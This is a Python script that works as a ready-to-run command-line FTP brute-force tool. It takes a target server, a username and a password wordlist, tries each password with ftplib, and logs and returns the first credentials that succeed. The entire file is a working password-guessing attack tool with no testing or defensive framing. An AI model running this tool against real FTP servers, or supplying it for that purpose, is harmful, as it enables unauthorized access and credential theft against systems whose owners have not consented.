import ftplib
import argparse
import logging


def ftp_brute_force(target, username, wordlist_path):
    """
    Perform brute force on an FTP server.
    :param target: FTP server address.
    :param username: Username for login.
    :param wordlist_path: Path to the password wordlist.
    """
    logging.info(f"Starting FTP brute force on {target} with username: {username}")

    try:
        with open(wordlist_path, "r") as wordlist:
            for password in wordlist:
                password = password.strip()
                try:
                    with ftplib.FTP(target) as ftp:
                        ftp.login(user=username, passwd=password)
                        logging.info(f"Login successful: {username}:{password}")
                        return f"Success: {username}:{password}"
                except ftplib.error_perm:
                    logging.info(f"Failed login: {username}:{password}")
    except FileNotFoundError:
        logging.error(f"Wordlist file not found: {wordlist_path}")
    except Exception as e:
        logging.error(f"Error during brute force: {e}")

    return "Brute force failed."


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="FTP Brute Force Tool")
    parser.add_argument("--target", required=True, help="Target FTP server address")
    parser.add_argument("--username", required=True, help="FTP username")
    parser.add_argument("--wordlist", required=True, help="Path to the password wordlist")
    args = parser.parse_args()

    logging.basicConfig(level=logging.INFO)
    result = ftp_brute_force(args.target, args.username, args.wordlist)
    print(result)
